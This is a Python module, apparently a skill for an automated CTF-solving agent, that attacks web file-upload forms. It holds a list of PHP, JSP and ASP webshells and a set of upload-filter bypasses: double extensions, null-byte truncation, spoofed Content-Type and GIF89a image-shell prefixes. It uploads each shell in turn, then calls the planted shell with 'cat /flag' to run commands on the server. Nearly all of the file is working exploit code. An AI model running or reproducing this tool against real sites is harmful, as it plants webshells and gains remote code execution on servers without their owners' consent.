"""文件上传绕过 Skill：自动探测上传点并绕过过滤提取 flag。

适用场景：Web 题存在文件上传功能，需绕过扩展名/Content-Type/MIME 过滤上传 webshell。
输入：upload_url + 本地路径
输出：flag 或 webshell 访问 URL
"""
import re
import os

try:
    import httpx
except ImportError:
    httpx = None


WEBSHELLS = {
    "php": '<?php system($_GET["cmd"]); ?>',
    "php_short": '<?=`$_GET[1]`;?>',
    "phtml": '<?php system($_GET["cmd"]); ?>',
    "php5": '<?php system($_GET["cmd"]); ?>',
    "jsp": '<% Runtime.getRuntime().exec("cat /flag"); %>',
    "asp": '<% Response.Write("test") %>',
    "aspx": '<%@ Page Language="C#" %><% Response.Write("test"); %>',
}

BYPASS_TECHNIQUES = [
    # 扩展名绕过
    {"ext": "php", "bypass": "php.jpg", "content_type": "image/jpeg"},
    {"ext": "php", "bypass": "php "},
    {"ext": "php", "bypass": "php."},
    {"ext": "php", "bypass": "PhP"},
    {"ext": "php", "bypass": "phtml"},
    {"ext": "php", "bypass": "php5"},
    # 双扩展名
    {"ext": "php", "bypass": "php.jpg.php"},
    {"ext": "php", "bypass": "php.php.jpg"},
    # 空字节截断
    {"ext": "php", "bypass": "php\x00.jpg"},
    {"ext": "php", "bypass": "php%00.jpg"},
    # Content-Type 绕过
    {"ext": "php", "bypass": "shell.php", "content_type": "image/gif"},
    {"ext": "php", "bypass": "shell.php", "content_type": "image/png"},
    {"ext": "php", "bypass": "shell.php", "content_type": "image/jpeg"},
    # 图片马
    {"ext": "php", "bypass": "shell.php", "content_type": "image/gif", "prefix": "GIF89a;"},
]


def _upload(url, field_name, filename, content, content_type):
    if httpx is None:
        return ""
    try:
        files = {field_name: (filename, content, content_type)}
        resp = httpx.post(url, files=files, timeout=10, follow_redirects=True)
        return resp.text
    except Exception:
        return ""


def run(target_url: str = "", field_name: str = "file", **kwargs) -> dict:
    results = {"flag": "", "evidence": "", "webshell_url": ""}

    target_url = target_url or kwargs.get("url", "")
    field_name = field_name or kwargs.get("field", "file")

    if not target_url:
        results["evidence"] = "缺少 target_url 参数"
        return results

    flag_pattern = re.compile(r"(?:flag|DASCTF)\{[^}]+\}")

    for ext, shell_code in WEBSHELLS.items():
        for technique in BYPASS_TECHNIQUES:
            if technique["ext"] != ext:
                continue
            filename = technique["bypass"]
            ct = technique.get("content_type", "application/octet-stream")
            content = technique.get("prefix", "") + shell_code

            text = _upload(target_url, field_name, filename, content, ct)
            if not text:
                continue

            # 检查上传路径
            path_match = re.search(r'(?:upload|path|href|src)[=:]\s*["\']?([^"\'<>\s]+\.(?:php|phtml|php5))', text, re.I)
            if path_match:
                results["webshell_url"] = path_match.group(1)
                results["evidence"] = f"上传成功: {filename} -> {path_match.group(1)}"

                # 尝试 RCE 获取 flag
                if httpx and results["webshell_url"]:
                    rce_url = results["webshell_url"]
                    if "?" not in rce_url:
                        rce_url += "?cmd=cat+/flag"
                    else:
                        rce_url += "&cmd=cat+/flag"
                    try:
                        rce_resp = httpx.get(rce_url, timeout=10)
                        flag_match = flag_pattern.search(rce_resp.text)
                        if flag_match:
                            results["flag"] = flag_match.group(0)
                            return results
                    except Exception:
                        pass

            # 检查响应中直接返回 flag
            flag_match = flag_pattern.search(text)
            if flag_match:
                results["flag"] = flag_match.group(0)
                results["evidence"] = f"上传绕过成功: {filename}"
                return results

    results["evidence"] = "未找到上传绕过方法"
    return results